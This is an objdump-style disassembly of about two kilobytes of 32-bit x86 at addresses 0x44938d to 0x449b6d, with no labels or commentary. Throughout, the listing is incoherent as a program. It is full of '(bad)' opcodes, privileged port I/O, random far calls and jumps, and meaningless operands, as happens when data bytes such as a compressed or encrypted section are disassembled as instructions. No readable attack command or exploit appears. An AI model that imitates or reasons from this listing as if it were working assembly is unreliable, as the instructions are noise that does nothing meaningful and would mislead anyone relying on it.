  44938d:	inc    eax
  44938e:	jecxz  0x44936c
  449390:	sbb    eax,0x94e8d871
  449395:	xor    DWORD PTR [eax+0x1aa0ecb4],eax
  44939b:	nop
  44939c:	push   ebp
  44939d:	push   ss
  44939e:	inc    eax
  44939f:	loop   0x4493ef
  4493a1:	loope  0x4493a8
  4493a3:	fist   WORD PTR [esi+ebx*2-0x1f4ecb20]
  4493aa:	(bad)  [esi+0x11db0044]
  4493b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4493b1:	sti    
  4493b2:	push   ss
  4493b3:	out    dx,eax
  4493b4:	fmul   st(6),st
  4493b6:	push   ecx
  4493b7:	stos   BYTE PTR es:[edi],al
  4493b8:	sub    dh,BYTE PTR [eax+0x6c]
  4493bb:	jbe    0x449418
  4493bd:	xor    BYTE PTR [ebx+0x72],0x41
  4493c1:	mov    WORD PTR [edx-0xe53f9e9],gs
  4493c7:	xlat   BYTE PTR ds:[ebx]
  4493c8:	mov    bl,BYTE PTR [ecx+0x2c649a10]
  4493ce:	test   al,0x9c
  4493d0:	das    
  4493d1:	pusha  
  4493d2:	mov    ebp,0xc2c0bc4
  4493d7:	mov    eax,0x6180a803
  4493dc:	pminub mm0,QWORD PTR [ebx+edi*2-0x4275d19c]
  4493e4:	mov    ah,0xf5
  4493e6:	or     cl,BYTE PTR [ecx+edi*1+0x53244cfc]
  4493ed:	sub    eax,0xf600f107
  4493f2:	iret   
  4493f3:	fisub  WORD PTR [ebp+edi*2+0x12]
  4493f7:	push   ecx
  4493f8:	jo     0x4493b9
  4493fa:	les    esp,FWORD PTR [ebp+0x33]
  4493fd:	(bad)  
  4493fe:	outs   dx,DWORD PTR ds:[esi]
  4493ff:	inc    ecx
  449400:	(bad)  
  449402:	push   esi
  449403:	mov    ah,0x82
  449405:	bswap  esp
  449407:	inc    edi
  449408:	mov    ah,0xf0
  44940a:	call   0x512c:0xf6e68910
  449411:	add    eax,0x6e489bd
  449416:	inc    esi
  449417:	retf   0x7c09
  44941a:	adc    ebx,eax
  44941c:	inc    edx
  44941d:	(bad)  
  44941e:	mov    ecx,0x6d9a690a
  449423:	push   0x48
  449425:	out    dx,al
  449426:	adc    BYTE PTR [eax],0xe0
  449429:	mov    eax,ds:0x1cb858fa
  44942e:	ret    0xa6ea
  449431:	outs   dx,BYTE PTR ds:[esi]
  449432:	sub    ebp,DWORD PTR [edx]
  449434:	push   esp
  449435:	inc    ebx
  449436:	mov    al,0xb9
  449438:	add    BYTE PTR [edx+edx*2+0x1eae867b],cl
  44943f:	test   eax,0xaf0ca0ad
  449444:	rcl    BYTE PTR [ecx],0x28
  449447:	cmp    DWORD PTR [edx-0x2774cb02],eax
  44944d:	loopne 0x4493e5
  44944f:	mov    edx,0x72cd3b8c
  449454:	or     BYTE PTR ds:0xf4242ced,al
  44945a:	imul   BYTE PTR [eax+0x74902249]
  449460:	ins    DWORD PTR es:[edi],dx
  449461:	in     eax,dx
  449462:	add    BYTE PTR ds:0x9ea80be,0x53
  449469:	daa    
  44946a:	pusha  
  44946b:	push   eax
  44946c:	fmul   DWORD PTR [edi-0x32fcf58a]
  449472:	cmp    cl,BYTE PTR [eax-0x770b8943]
  449478:	dec    esp
  449479:	dec    esp
  44947a:	(bad)  
  44947b:	aaa    
  44947c:	lea    eax,[esi]
  44947e:	(bad)  
  449480:	cwde   
  449481:	aas    
  449482:	imul   ebp,DWORD PTR [ebp+0x1a],0x54f54180
  449489:	and    BYTE PTR [esi],0xce
  44948c:	or     al,bl
  44948e:	arpl   WORD PTR [ecx],dx
  449490:	jmp    0xd5b7:0xe088e771
  449497:	or     dh,ah
  449499:	mov    eax,0x72e2d210
  44949e:	jbe    0x4494d5
  4494a0:	mov    ds:0x5c3c242e,eax
  4494a5:	sar    BYTE PTR [eax+0x208f151e],0x16
  4494ac:	(bad)  
  4494ad:	(bad)
  4494b0:	ror    edx,1
  4494b2:	mov    ebp,0x6b616bda
  4494b7:	inc    eax
  4494b8:	ret    0x5b1c
  4494bb:	shl    DWORD PTR [esi-0x133b854b],1
  4494c1:	push   ebx
  4494c2:	(bad)  
  4494c5:	mov    ss,WORD PTR [ecx-0x2c]
  4494c8:	das    
  4494c9:	add    BYTE PTR [ebx],al
  4494cb:	inc    ebx
  4494cc:	add    dh,ah
  4494ce:	lods   al,BYTE PTR ds:[esi]
  4494cf:	lock xchg esp,eax
  4494d1:	push   eax
  4494d2:	mov    ah,0x1d
  4494d4:	clc    
  4494d5:	mov    WORD PTR [edx-0x72],gs
  4494d8:	leave  
  4494d9:	dec    edx
  4494da:	in     eax,0x1b
  4494dc:	mov    esi,0x33b4bc65
  4494e1:	push   ebx
  4494e2:	mov    WORD PTR [edi+0x27b34f4a],es
  4494e8:	ss sbb al,0x59
  4494eb:	faddp  st(4),st
  4494ed:	push   eax
  4494ee:	repz aad 0x32
  4494f1:	(bad)  
  4494f3:	inc    esi
  4494f4:	ret    
  4494f5:	cmp    bh,BYTE PTR [edx-0x16]
  4494f8:	push   edx
  4494f9:	dec    edi
  4494fa:	hlt    
  4494fb:	or     BYTE PTR [edx],ah
  4494fd:	ds ins BYTE PTR es:[edi],dx
  4494ff:	outs   dx,DWORD PTR ds:[esi]
  449500:	loopne 0x44957a
  449502:	xor    DWORD PTR [edx+ebx*4],edx
  449505:	std    
  449506:	push   es
  449507:	aam    0x52
  449509:	ja     0x449519
  44950b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44950c:	push   ds
  44950d:	adc    BYTE PTR [eax+0x14],dh
  449510:	stos   BYTE PTR es:[edi],al
  449511:	push   ds
  449512:	sbb    edx,0xffffff88
  449515:	retf   0x121d
  449518:	push   cs
  449519:	mov    al,0x9c
  44951b:	mov    esp,0xd005e049
  449520:	cs cs int3 
  449523:	sub    edx,DWORD PTR [ecx-0x28]
  449526:	and    ecx,DWORD PTR [edx-0x1407588]
  44952c:	cmp    BYTE PTR [edi+eax*2],0x3a
  449530:	shl    BYTE PTR [edi],0xa4
  449533:	push   esi
  449534:	mov    dl,0xb9
  449536:	adc    BYTE PTR [esi+0xd90270a],ch
  44953c:	mov    al,ds:0xbdd002f6
  449541:	jo     0x44954d
  449543:	or     DWORD PTR [edi+ebx*8-0x2d67e95e],ebp
  44954a:	loop   0x4494ee
  44954c:	in     al,dx
  44954d:	adc    DWORD PTR [edx],ebx
  44954f:	xor    al,0x6a
  449551:	mov    DWORD PTR ds:0x70b48fac,0x286454e
  44955b:	mov    dh,0x82
  44955d:	outs   dx,DWORD PTR ds:[esi]
  44955e:	push   esi
  44955f:	mov    ebx,0xe704e12
  449564:	pop    ebx
  449565:	jmp    0x449508
  449567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449568:	xchg   DWORD PTR [eax-0x39eb7356],ebp
  44956e:	sbb    DWORD PTR [edi-0x5a],0xffffffb6
  449572:	addr16 lock dec edi
  449575:	(bad)  
  449576:	add    al,0xc3
  449578:	xor    ch,dh
  44957a:	(bad)  
  44957b:	shl    BYTE PTR [ecx+0xb8e24a9],1
  449581:	add    al,0xd8
  449583:	aad    0x51
  449585:	ror    BYTE PTR [esi+0xf4c0df],1
  44958b:	jmp    0x4078f11c
  449590:	and    BYTE PTR [esi-0x6e],bh
  449593:	jb     0x449578
  449595:	mov    eax,0xe302b509
  44959a:	cmp    bh,BYTE PTR [esp+eax*2-0x4a716535]
  4495a1:	pop    ebp
  4495a2:	add    bh,al
  4495a4:	je     0x4495ba
  4495a6:	sti    
  4495a7:	dec    edx
  4495a8:	xchg   edx,eax
  4495a9:	jo     0x44955c
  4495ab:	add    al,0x90
  4495ad:	push   eax
  4495ae:	gs dec eax
  4495b0:	int3   
  4495b1:	sahf   
  4495b2:	loopne 0x449558
  4495b4:	punpckhdq mm7,QWORD PTR [ebx-0x1dbcec]
  4495bb:	and    BYTE PTR [di+0x3d23],ch
  4495c0:	add    al,0x51
  4495c2:	in     al,dx
  4495c3:	jmp    DWORD PTR [ebp+ecx*2+0x1d41cedd]
  4495ca:	adc    al,dl
  4495cc:	add    ebx,edx
  4495ce:	(bad)  
  4495cf:	addr16 pusha 
  4495d1:	ins    DWORD PTR es:[edi],dx
  4495d2:	push   es
  4495d3:	ret    0x5cb0
  4495d6:	jo     0x449646
  4495d8:	mov    ds:0xf6a11e1,eax
  4495dd:	pop    esp
  4495de:	cdq    
  4495df:	dec    eax
  4495e0:	lods   al,BYTE PTR ds:[esi]
  4495e1:	or     al,0xa0
  4495e3:	cli    
  4495e4:	std    
  4495e5:	nop
  4495e6:	test   BYTE PTR [esi],ah
  4495e8:	fcmovb st,st(7)
  4495ea:	sbb    al,0xd8
  4495ec:	stos   DWORD PTR es:[edi],eax
  4495ed:	neg    BYTE PTR [eax-0x10]
  4495f0:	and    al,0xa6
  4495f2:	xchg   esp,eax
  4495f3:	jle    0x449618
  4495f5:	add    bh,dh
  4495f7:	push   edi
  4495f8:	sub    eax,0xa25fa56b
  4495fd:	dec    esp
  4495fe:	daa    
  4495ff:	add    ebp,DWORD PTR [esi+0x350dbacd]
  449605:	push   cs
  449606:	inc    eax
  449607:	ficom  DWORD PTR [edi+0x500f7cbe]
  44960d:	or     BYTE PTR [ecx-0x5b],ch
  449610:	jp     0x4495c6
  449612:	cwde   
  449613:	pop    ecx
  449614:	mov    al,0x1d
  449616:	sbb    bl,al
  449618:	(bad)  
  44961a:	fsubr  QWORD PTR [edx+0x2b]
  44961d:	push   0x13
  44961f:	and    BYTE PTR [esp+ebp*1-0x46],0x30
  449624:	or     BYTE PTR [esi],0xaa
  449627:	ret    0xb44a
  44962a:	int3   
  44962b:	adc    bl,BYTE PTR [esi]
  44962d:	les    eax,FWORD PTR [esi-0x26c9fd9a]
  449633:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449635:	or     BYTE PTR [esi],0x31
  449638:	inc    eax
  449639:	cli    
  44963a:	push   esi
  44963b:	adc    al,0xdb
  44963d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44963e:	add    DWORD PTR [esp+edi*8+0x36],edi
  449642:	sbb    al,0x5c
  449644:	xor    ebp,DWORD PTR [esi]
  449646:	sub    ch,BYTE PTR [esi+0x120d7a4a]
  44964c:	hlt    
  44964d:	mov    ch,0xdb
  44964f:	push   0xfffffff8
  449651:	ss icebp 
  449653:	shl    BYTE PTR [eax],0xda
  449656:	adc    BYTE PTR [ecx+0x5eb29c98],ch
  44965c:	mov    ds:0x3627cc89,al
  449661:	push   cs
  449662:	ret    0x6d10
  449665:	xchg   ecx,eax
  449666:	jno    0x4496dc
  449668:	dec    esp
  449669:	xor    BYTE PTR [ebp+0x64],bl
  44966c:	out    dx,al
  44966d:	push   0xd05c15ad
  449672:	lea    ebx,[eax]
  449674:	lods   eax,DWORD PTR ds:[esi]
  449675:	inc    esi
  449676:	int3   
  449677:	push   ss
  449678:	mov    ch,0x9a
  44967a:	into   
  44967b:	or     eax,0xe8a86b50
  449680:	paddq  mm4,QWORD PTR [ecx]
  449683:	cli    
  449684:	push   esp
  449685:	dec    eax
  449686:	mov    es,WORD PTR [ecx+0x700b6d7a]
  44968c:	mov    DWORD PTR [ebp+0x5c361640],ebp
  449692:	mov    ds:0x4b5e8cc1,al
  449697:	adc    dl,BYTE PTR [eax+0x9]
  44969a:	jecxz  0x449682
  44969c:	lds    ecx,FWORD PTR [esi]
  44969e:	sbb    DWORD PTR [ecx-0x1d30efb2],eax
  4496a4:	dec    ecx
  4496a5:	loopne 0x4496c8
  4496a7:	scas   eax,DWORD PTR es:[edi]
  4496a8:	fs std 
  4496aa:	xchg   edx,eax
  4496ab:	mov    WORD PTR [ecx-0x1171474b],ss
  4496b1:	sbb    eax,eax
  4496b3:	dec    ebx
  4496b4:	dec    ecx
  4496b5:	sub    al,0x79
  4496b7:	dec    esp
  4496b8:	call   0x6c62a8d6
  4496bd:	leave  
  4496be:	iret   
  4496bf:	jbe    0x449717
  4496c1:	mov    DWORD PTR [esi],0x67206051
  4496c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4496c8:	dec    esp
  4496c9:	sbb    ebp,ebp
  4496cb:	adc    eax,0xe8227a81
  4496d0:	inc    edi
  4496d1:	retf   0x59e0
  4496d4:	int    0x6c
  4496d6:	jl     0x449728
  4496d8:	mov    ds:0xe858703a,al
  4496dd:	push   edx
  4496de:	sub    BYTE PTR [edx-0x503dd20],bl
  4496e4:	xor    BYTE PTR [eax+0x7d24966],dh
  4496ea:	dec    ebx
  4496eb:	(bad)  
  4496ec:	cwde   
  4496ed:	mov    edi,0xedac27fc
  4496f2:	mov    esi,0xe22c0aa3
  4496f7:	nop
  4496f8:	ds cmp al,0x0
  4496fb:	(bad)  
  4496fc:	mov    ecx,DWORD PTR [eax-0x7db0ba6]
  449702:	mov    esp,0x7cbd3568
  449707:	sub    BYTE PTR [edx-0x56ca1ba2],0x6
  44970e:	icebp  
  44970f:	push   esi
  449710:	cwde   
  449711:	pop    eax
  449712:	adc    ecx,DWORD PTR [eax+0x72]
  449715:	jne    0x449753
  449717:	jmp    0xfa497b4e
  44971c:	dec    esp
  44971d:	imul   eax,DWORD PTR [ebp-0x4b],0x70
  449721:	sbb    al,0x2f
  449723:	jp     0x449772
  449725:	arpl   WORD PTR [esi-0x25],si
  449728:	sbb    BYTE PTR [ecx+0x22],dl
  44972b:	int3   
  44972c:	push   ds
  44972d:	sbb    BYTE PTR [eax],cl
  44972f:	jl     0x4496b5
  449731:	sar    DWORD PTR [esp+eax*2-0x7c],1
  449735:	sbb    dl,BYTE PTR ds:0x11e35881
  44973b:	push   0xffffffbb
  44973d:	sub    bl,dl
  44973f:	mov    ch,0x39
  449741:	and    DWORD PTR [esp+edx*4-0x38],edx
  449745:	jb     0x449735
  449747:	iret   
  449748:	xchg   ebp,eax
  449749:	sub    al,0x34
  44974b:	cld    
  44974c:	test   BYTE PTR [edx-0x2bb0c67],ah
  449752:	aam    0x47
  449754:	inc    ebx
  449755:	clc    
  449756:	dec    eax
  449757:	outs   dx,DWORD PTR ds:[esi]
  449758:	lea    esp,[eax-0x6]
  44975b:	jge    0x4497d9
  44975d:	test   ah,dh
  44975f:	dec    ebx
  449760:	loop   0x449744
  449762:	sub    dl,BYTE PTR [eax+ecx*4-0xa69dea9]
  449769:	inc    esp
  44976a:	fmul   QWORD PTR [eax+ebx*2+0x2a]
  44976e:	sbb    al,BYTE PTR [edi+0x58]
  449771:	cli    
  449772:	in     eax,0xce
  449774:	push   ds
  449775:	inc    esp
  449776:	loop   0x4497ed
  449778:	fldenv [ebx+0x6c]
  44977b:	sub    BYTE PTR [eax],bh
  44977d:	mov    al,ds:0x5289aee2
  449782:	jp     0x449709
  449784:	test   BYTE PTR [edi-0x3a054f80],cl
  44978a:	call   0xbd00:0x71e48af6
  449791:	mov    BYTE PTR ss:[ecx+0x5b],al
  449795:	add    al,0x18
  449797:	je     0x4497b5
  449799:	rcr    al,0x4e
  44979c:	inc    edx
  44979d:	lahf   
  44979e:	nop
  44979f:	mov    bl,0xba
  4497a1:	add    DWORD PTR [ebp+0x5a4a592a],eax
  4497a7:	push   0x60
  4497a9:	mov    dh,0x27
  4497ab:	inc    ecx
  4497ac:	clc    
  4497ad:	dec    esi
  4497ae:	and    cl,BYTE PTR [edi+0x60]
  4497b1:	sar    DWORD PTR [edx],cl
  4497b3:	mov    BYTE PTR [eax+ecx*1],bh
  4497b6:	mov    al,ds:0x9476d048
  4497bb:	js     0x4497a3
  4497bd:	mov    edi,0x55d495c7
  4497c2:	cmp    ch,BYTE PTR [ebx-0x14]
  4497c5:	jno    0x449833
  4497c7:	xchg   edx,eax
  4497c8:	nop
  4497c9:	test   DWORD PTR [esi+0xa59614b],esp
  4497cf:	sub    cl,BYTE PTR [edi]
  4497d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4497d2:	icebp  
  4497d3:	mov    ch,0x4d
  4497d5:	and    BYTE PTR [eax+0x31b2e2a6],bh
  4497db:	mov    bh,0xa6
  4497dd:	adc    eax,0x5af5b43
  4497e2:	jp     0x449791
  4497e4:	fdiv   st(4),st
  4497e6:	test   DWORD PTR [esi+ecx*4],eax
  4497e9:	(bad)  
  4497ea:	js     0x44978a
  4497ec:	ret    0xefc8
  4497ef:	and    cl,ah
  4497f1:	daa    
  4497f2:	add    DWORD PTR [edx+eax*8+0x190603e3],0x3abaf683
  4497fd:	mov    ss,WORD PTR [edx]
  4497ff:	pop    edx
  449800:	out    dx,al
  449801:	cmp    cl,BYTE PTR [esi+0x4e826d0c]
  449807:	test   DWORD PTR [esi+0x6c],esi
  44980a:	push   es
  44980b:	loop   0x449882
  44980d:	cmp    al,0x1a
  44980f:	fidivr DWORD PTR [eax+ecx*1-0x6]
  449813:	(bad)  
  449815:	inc    edx
  449816:	pop    esp
  449817:	cs stos BYTE PTR es:[edi],al
  449819:	mov    eax,ds:0x2e768ea9
  44981e:	(bad)  
  44981f:	mov    al,0x25
  449821:	call   0xcc33:0x865d8586
  449828:	(bad)  
  449829:	aad    0x9b
  44982b:	test   dh,dl
  44982d:	je     0x4498ab
  44982f:	aam    0xe7
  449831:	and    esp,DWORD PTR [edx+0x50523c30]
  449837:	js     0x44987d
  449839:	loopne 0x449862
  44983b:	xchg   esi,eax
  44983c:	or     eax,0xf9dfead7
  449841:	xchg   ecx,eax
  449842:	xor    BYTE PTR fs:[ecx+0xa028488],ah
  449849:	inc    edx
  44984a:	adc    esp,DWORD PTR [esi+ecx*1]
  44984d:	lea    eax,[edi]
  44984f:	mov    eax,0x2b6ef006
  449854:	sub    BYTE PTR [esp+ebx*4+0x16],ah
  449858:	or     esp,eax
  44985a:	or     BYTE PTR [edi],0x48
  44985d:	pop    esi
  44985e:	dec    edx
  44985f:	scas   al,BYTE PTR es:[edi]
  449860:	mov    eax,ds:0xf0b1e124
  449865:	inc    ebx
  449866:	mov    edx,0xd0ee2b83
  44986b:	jb     0x4498b8
  44986d:	adc    ebx,DWORD PTR [edi-0x7edd8fb7]
  449873:	push   esp
  449874:	add    DWORD PTR [eax-0x14f429e1],ecx
  44987a:	add    al,0x9a
  44987c:	nop
  44987d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44987e:	sbb    DWORD PTR [edi+eax*1+0x62121fe2],ebp
  449885:	inc    esi
  449886:	test   BYTE PTR [edi],cl
  449888:	dec    ecx
  449889:	push   esi
  44988a:	add    al,0x5a
  44988c:	ret    0xf1fa
  44988f:	or     al,0xa1
  449891:	rcl    BYTE PTR [eax+0x55],cl
  449894:	pop    esi
  449895:	call   0x3d0:0xf85a5eb4
  44989c:	es dec esp
  44989e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44989f:	sbb    esi,edx
  4498a1:	mov    esi,0xbfdafd40
  4498a6:	or     DWORD PTR [edx-0x5],0xffffffca
  4498aa:	inc    edx
  4498ab:	jl     0x44983b
  4498ad:	aaa    
  4498ae:	xor    esp,DWORD PTR [esi+ebx*4+0x384828d8]
  4498b5:	add    BYTE PTR [edx+0x4e],dl
  4498b8:	mov    dh,0xb0
  4498ba:	mov    eax,ds:0x6c71c281
  4498bf:	rol    BYTE PTR [eax],cl
  4498c1:	scas   al,BYTE PTR es:[edi]
  4498c2:	mov    DWORD PTR [edi],ebx
  4498c4:	jb     0x449851
  4498c6:	mov    DWORD PTR [esi+0x54],ebx
  4498c9:	test   DWORD PTR [edi],ecx
  4498cb:	push   eax
  4498cc:	sub    ebp,DWORD PTR [edx+0xd322c1]
  4498d2:	(bad)  
  4498d3:	cli    
  4498d4:	xchg   ebp,eax
  4498d5:	or     DWORD PTR [esp+eiz*4],edi
  4498d8:	push   0x23864b92
  4498dd:	test   al,0x41
  4498df:	ret    0x127c
  4498e2:	mov    ebx,0x18ed003c
  4498e7:	rcl    BYTE PTR [ebp*8+0x7ceeae8e],cl
  4498ee:	xchg   DWORD PTR [edx],esi
  4498f0:	push   eax
  4498f1:	dec    ebp
  4498f2:	pusha  
  4498f3:	push   ebp
  4498f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4498f5:	es adc eax,0xadb09954
  4498fb:	add    al,0x82
  4498fd:	hlt    
  4498fe:	test   BYTE PTR [ebp-0x4a],0xd9
  449902:	mov    es,WORD PTR [ebx-0x66]
  449905:	shl    BYTE PTR [eax],0xc8
  449908:	fdivr  st(4),st
  44990a:	mov    dl,0xda
  44990c:	ds push ss
  44990e:	imul   eax,DWORD PTR [edx],0xffffff8f
  449911:	test   eax,0x5b648088
  449916:	inc    esp
  449917:	dec    esi
  449918:	jmp    0x4498e2
  44991a:	shl    BYTE PTR [eax+esi*2],0x1a
  44991e:	inc    ebx
  44991f:	fiadd  DWORD PTR [esi-0x187760a0]
  449925:	sub    BYTE PTR [ebx+0x2bd43a95],bh
  44992b:	pop    eax
  44992c:	test   al,0x24
  44992e:	std    
  44992f:	mov    ah,0x27
  449931:	fwait
  449932:	mov    al,0xa0
  449934:	loop   0x449938
  449936:	pop    esi
  449937:	mov    esi,0xcbae97f4
  44993c:	lods   al,BYTE PTR ds:[esi]
  44993d:	test   al,0x6a
  44993f:	(bad)  
  449940:	and    BYTE PTR [esi-0x57b511a5],al
  449946:	mov    ah,0x4
  449948:	test   eax,0x4172e819
  44994d:	push   0xffffffb4
  44994f:	sub    ch,0x42
  449952:	clc    
  449953:	adc    dh,0x85
  449956:	bound  ecx,QWORD PTR [esp+eax*8-0x50]
  44995a:	jae    0x96e791fb
  449960:	inc    eax
  449961:	sbb    dh,cl
  449963:	mov    ds:0x616208ae,al
  449968:	popf   
  449969:	(bad)  
  44996a:	pop    eax
  44996b:	jnp    0x449913
  44996d:	mov    ah,BYTE PTR [ecx-0x4c]
  449970:	mov    eax,0x76db3402
  449975:	dec    edi
  449976:	stos   DWORD PTR es:[edi],eax
  449977:	add    BYTE PTR [edx+0x11],0xbe
  44997b:	or     al,0x68
  44997d:	adc    eax,0x918686b5
  449982:	mov    esp,0xe8f13878
  449987:	daa    
  449988:	clc    
  449989:	clc    
  44998a:	cmp    BYTE PTR [esi],dh
  44998c:	mov    al,0xa0
  44998e:	add    BYTE PTR [edx+0x48],0xe2
  449992:	pop    ds
  449993:	xchg   esi,eax
  449994:	sub    DWORD PTR [ebx-0x77a6ebd3],esp
  44999a:	out    0x24,al
  44999c:	(bad)  
  44999d:	jbe    0x44999f
  44999f:	jecxz  0x449943
  4499a1:	pop    ecx
  4499a2:	test   BYTE PTR [eax-0xc],bl
  4499a5:	mov    bh,0xd0
  4499a7:	das    
  4499a8:	mov    ah,0xea
  4499aa:	inc    ebx
  4499ab:	out    dx,al
  4499ac:	ins    BYTE PTR es:[edi],dx
  4499ad:	(bad)  
  4499ae:	cmc    
  4499af:	jmp    0x4499f1
  4499b1:	clc    
  4499b2:	cmp    eax,eax
  4499b4:	mov    es,WORD PTR [edi+0xa]
  4499b7:	jle    0x449992
  4499b9:	in     al,0xaa
  4499bb:	lock adc BYTE PTR [edx],0x1e
  4499bf:	push   ecx
  4499c0:	mov    ah,BYTE PTR [edx]
  4499c2:	mov    dl,0x6a
  4499c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4499c5:	lods   eax,DWORD PTR ds:[esi]
  4499c6:	loop   0x4499f0
  4499c8:	xchg   ebx,eax
  4499c9:	sbb    al,0x30
  4499cb:	mov    eax,0x911ede38
  4499d0:	pop    eax
  4499d1:	shl    BYTE PTR ds:0x66b4c6b8,1
  4499d7:	in     eax,dx
  4499d8:	xor    eax,0x6a7c4488
  4499dd:	jg     0x4499d7
  4499df:	sahf   
  4499e0:	lea    esi,[ebp+0x642d49aa]
  4499e6:	mov    ss,WORD PTR [ecx+0x4e]
  4499e9:	sbb    al,0x6a
  4499eb:	and    ebp,ebp
  4499ed:	cmp    BYTE PTR [eax],ah
  4499ef:	cmp    dh,al
  4499f1:	sub    dh,dh
  4499f3:	imul   eax,DWORD PTR [eax+0x44],0x5b
  4499f7:	je     0x449a5d
  4499f9:	xor    ah,dl
  4499fb:	jge    0x4499fe
  4499fd:	cmp    bh,bl
  4499ff:	les    esi,FWORD PTR [ebx]
  449a01:	mov    al,0x3d
  449a03:	dec    esi
  449a04:	in     al,0x5e
  449a06:	jmp    0x6aca:0x1e074035
  449a0d:	add    eax,0xdbca1172
  449a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449a13:	xchg   DWORD PTR [ebp-0x73],ebx
  449a16:	daa    
  449a17:	mov    ebp,0xa9f4fa04
  449a1c:	pop    esi
  449a1d:	fst    DWORD PTR [esi]
  449a1f:	sub    ch,BYTE PTR [eax]
  449a21:	add    edx,edi
  449a23:	xchg   esi,eax
  449a24:	xchg   ebp,eax
  449a25:	jmp    0xfe4c3b61
  449a2a:	(bad)  
  449a2b:	xlat   BYTE PTR ds:[ebx]
  449a2c:	in     al,0x34
  449a2e:	and    eax,DWORD PTR [ecx-0x71d8278a]
  449a34:	in     eax,dx
  449a35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449a36:	xor    al,0xc6
  449a38:	aaa    
  449a39:	stos   BYTE PTR es:[edi],al
  449a3a:	jle    0x449a47
  449a3c:	add    ecx,DWORD PTR [ebx]
  449a3e:	lods   eax,DWORD PTR ds:[esi]
  449a3f:	sub    al,0x27
  449a41:	gs xchg esp,eax
  449a43:	mov    cl,0x79
  449a45:	xchg   ecx,eax
  449a46:	les    esi,FWORD PTR [ebx]
  449a48:	xchg   ebx,eax
  449a49:	or     eax,0x2aeaa10
  449a4e:	add    DWORD PTR [edi+0x741ee010],eax
  449a54:	sub    eax,0x481d156c
  449a59:	(bad)  
  449a5a:	ror    BYTE PTR [ebx-0x72],1
  449a5d:	in     al,0xb4
  449a5f:	ror    BYTE PTR [edi],1
  449a61:	pop    ecx
  449a62:	(bad)  
  449a63:	sbb    dh,BYTE PTR [eax+0xbeb8e56]
  449a69:	mov    ds:0x842e2b4,eax
  449a6e:	mov    ebp,0x241612be
  449a73:	mov    al,ds:0xd9db437e
  449a78:	call   0x9cd8dcdb
  449a7d:	or     BYTE PTR [ebp+0x2c],0xf0
  449a81:	sbb    eax,DWORD PTR [eax-0x6debf667]
  449a87:	aam    0x56
  449a89:	stos   DWORD PTR es:[edi],eax
  449a8a:	push   cs
  449a8b:	jo     0x449abb
  449a8d:	jae    0x449a8c
  449a8f:	aad    0xdb
  449a91:	or     cl,BYTE PTR [esi-0x1b5eff10]
  449a97:	lock pop es
  449a99:	fsub   DWORD PTR [ebp+0x34]
  449a9c:	leave  
  449a9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449a9e:	cmp    al,BYTE PTR ds:0x295ac322
  449aa4:	loop   0x449a32
  449aa6:	mov    BYTE PTR [edx-0x1f83de76],dh
  449aac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449aad:	adc    DWORD PTR [ecx-0x114f0bba],0x2a0a829c
  449ab7:	gs loop 0x449a52
  449aba:	nop
  449abb:	pop    es
  449abc:	adc    eax,0xc3b6b5e
  449ac1:	adc    eax,0xb8a8744c
  449ac6:	push   esi
  449ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449ac8:	lods   al,BYTE PTR ds:[esi]
  449ac9:	ss sahf 
  449acb:	or     cl,ah
  449acd:	adc    al,0x63
  449acf:	es sbb al,0x24
  449ad2:	pop    ecx
  449ad3:	adc    esp,DWORD PTR [ecx+0x70fa88d8]
  449ad9:	add    al,0x56
  449adb:	mov    ecx,0x8c27568a
  449ae0:	add    BYTE PTR [edx-0xe2aed0f],ah
  449ae6:	mov    BYTE PTR [esi],cl
  449ae8:	jg     0x449ab7
  449aea:	fsub   DWORD PTR [ecx+0x49]
  449aed:	(bad)  
  449af0:	mov    al,ds:0xbdc1a50
  449af5:	inc    edx
  449af6:	mov    al,ds:0xe04ba282
  449afb:	add    bh,BYTE PTR [eax]
  449afd:	enter  0xc078,0x1a
  449b01:	fist   WORD PTR [ecx+edx*2]
  449b04:	mov    ds:0xb573ea2,al
  449b09:	mov    esp,0x46984e8c
  449b0e:	pop    ss
  449b0f:	int3   
  449b10:	in     al,0xf3
  449b12:	or     al,0xe0
  449b14:	mov    bh,0x5e
  449b16:	outs   dx,BYTE PTR ds:[esi]
  449b17:	fmul   DWORD PTR [edx]
  449b19:	dec    ecx
  449b1a:	xchg   esp,eax
  449b1b:	pop    edx
  449b1c:	inc    edx
  449b1d:	das    
  449b1e:	repnz mov ch,BYTE PTR [ebx-0x34]
  449b22:	adc    al,0xac
  449b24:	push   0xfc3e801d
  449b29:	retf   0x580d
  449b2c:	sub    edi,edx
  449b2e:	inc    ecx
  449b2f:	loopne 0x449b56
  449b31:	or     BYTE PTR [esi+0x4243193b],cl
  449b37:	fwait
  449b38:	mov    gs,WORD PTR [eax+ecx*2]
  449b3b:	add    al,0xd2
  449b3d:	iret   
  449b3e:	mov    BYTE PTR [eax],dl
  449b40:	lock cwde 
  449b42:	(bad)  
  449b43:	in     eax,dx
  449b44:	aad    0xee
  449b46:	in     al,dx
  449b47:	mov    ebp,0xfda2240d
  449b4c:	ret    0x9f5a
  449b4f:	pop    esi
  449b50:	mov    al,0x48
  449b52:	test   BYTE PTR [edi+0x12],ah
  449b55:	adc    BYTE PTR [edx],dl
  449b57:	dec    edx
  449b58:	lods   al,BYTE PTR ds:[esi]
  449b59:	jmp    0x5a8d:0x64b144d9
  449b60:	lahf   
  449b61:	ins    DWORD PTR es:[edi],dx
  449b62:	jl     0x449b9a
  449b64:	mov    cl,0xf0
  449b66:	fld    TBYTE PTR [esi-0x3d452ec4]
  449b6c:	(bad)  
  449b6d:	sub    bl,BYTE PTR [esi+0x3594a1a4]
